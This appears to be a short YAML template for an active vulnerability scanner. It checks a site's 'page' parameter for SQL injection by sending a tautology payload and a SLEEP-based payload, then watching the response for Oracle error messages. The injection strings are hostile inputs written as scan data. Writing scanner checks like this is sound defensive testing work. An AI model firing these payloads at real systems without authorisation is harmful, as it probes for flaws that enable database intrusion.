id: sqli-oracle-04
name: 'SQLi error oracle via page'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '" OR "1"="1'
        - ''' AND SLEEP(5)--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
